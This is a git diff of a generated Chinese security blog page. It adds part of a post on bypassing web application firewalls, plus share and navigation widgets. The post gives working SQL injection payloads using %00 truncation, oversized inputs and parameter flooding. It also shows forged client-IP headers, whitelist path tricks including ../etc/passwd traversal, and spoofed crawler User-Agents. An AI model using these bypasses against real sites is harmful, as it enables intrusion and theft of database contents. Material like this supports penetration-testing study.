+<p>（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可轻易Bypass。</p>
+<p>（3）HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</p>
+<p>（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</p>
+<p><strong>2、性能问题</strong></p>
+<p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p>
+<p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p>
+<p>举例1：</p>
+<ul>
+<li>?id=1 and (select 1)=(Select 0xA<em>1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9PS：0xA</em>1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</li>
+</ul>
+<p>举例2：</p>
+<ul>
+<li>?a0=0&amp;a1=1&amp;…..&amp;a100=100&amp;id=1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</li>
+</ul>
+<p>猜想3：多次重复提交同一个请求，有些通过了WAF，有些被WAF所拦截了，性能问题可能导致部分请求bypass。</p>
+<p><strong>3、白名单</strong></p>
+<p>方式一：IP白名单</p>
+<p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p>
+<p>测试方法：修改http的header来bypass waf</p>
+<p>X-forwarded-for</p>
+<p>X-remote-IP</p>
+<p>X-originating-IP</p>
+<p>x-remote-addr</p>
+<p>X-Real-ip</p>
+<p>方式二：静态资源</p>
+<p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>
+<p><a href="http://10.9.9.201/sql.php/1.js?id=1" target="_blank" rel="noopener">http://10.9.9.201/sql.php/1.js?id=1</a></p>
+<p>备注：Aspx/php只识别到前面的.aspx/.php 后面基本不识别</p>
+<p>方式三：url白名单</p>
+<p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势：</p>
+<p><a href="http://10.9.9.201/sql.php/admin.php?id=1http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwdhttp://10.9.9.201/../../../manage/../sql.asp?id=2" target="_blank" rel="noopener">http://10.9.9.201/sql.php/admin.php?id=1http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwdhttp://10.9.9.201/../../../manage/../sql.asp?id=2</a></p>
+<p>waf通过/manage/“进行比较，只要uri中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?a=/manage/&amp;b=../etc/passwd 绕过防御规则。</p>
+<p>方式四：爬虫白名单</p>
+<p>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</p>
+<p>1、 根据UserAgent  2、通过行为来判断</p>
+<p>UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。</p>
+<p>User Agent Switcher (Firefox 附加组件)，下载地址:</p>
+<p><a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/</a></p>
+<p>火狐插件安装完成后，按下ALT键，调出工具栏，伪造爬虫。</p>
+<p>常见的爬虫User-Agent：</p>
+<p>UserAgent: “Mozilla/5.0 (compatible; Googlebot/2.1; +<a href="http://www.google.com/bot.html)&quot;" target="_blank" rel="noopener">http://www.google.com/bot.html)&quot;</a> UserAgent: “Baiduspider+(+<a href="http://www.baidu.com/search/spider.htm)&quot;" target="_blank" rel="noopener">http://www.baidu.com/search/spider.htm)&quot;</a> UserAgent: “Mozilla/5.0 (compatible; Yahoo! Slurp; <a href="http://help.yahoo.com/help/us/ysearch/slurp)&quot;" target="_blank" rel="noopener">http://help.yahoo.com/help/us/ysearch/slurp)&quot;</a></p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -738,16 +341,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/09/02/%E7%BB%95%E8%BF%87WAF%E7%9A%84%E5%90%84%E7%A7%8D%E7%89%B9%E6%80%A7/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Holer内网穿透搭建记录
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/09/02/XSS%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XSS绕过技术</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -767,80 +438,14 @@
 
 
 
-
-  
-    <article id="post-Linux防御篇-第三章" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/Linux%E9%98%B2%E5%BE%A1%E7%AF%87-%E7%AC%AC%E4%B8%89%E7%AB%A0/">Linux防御篇-第三章</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/Linux%E9%98%B2%E5%BE%A1%E7%AF%87-%E7%AC%AC%E4%B8%89%E7%AB%A0/" class="archive-article-date">
-  	<time datetime="2020-09-02T07:59:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Inotify监控文件系统</p>
-<p>​      Inotify 是一个 Linux特性，它监控文件系统操作，比如读取、写入和创建。Inotify 反应灵敏，用法非常简单，并且比 cron 任务的繁忙轮询高效得多。学习如何将 inotify 集成到您的应用程序中，并发现一组可用来进一步自动化系统治理的命令行工具。</p>
-<p>​     可以实时监控 单个文件以及整个目录所发生的改变 如果发现任何更改 会向配置软件发信号。如果用户空间软件被更改 那么inotify会将其视为一个事件并马上报告。</p>
-<p>​      inotify通过监听文件或目录事件的改变，对数据进行备份，基于shell脚本进行实现。</p>
-        
-          <a class="article-more-a" href="/2020/09/02/Linux%E9%98%B2%E5%BE%A1%E7%AF%87-%E7%AC%AC%E4%B8%89%E7%AB%A0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/Linux%E9%98%B2%E5%BE%A1%E7%AF%87-%E7%AC%AC%E4%B8%89%E7%AB%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -863,8 +468,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
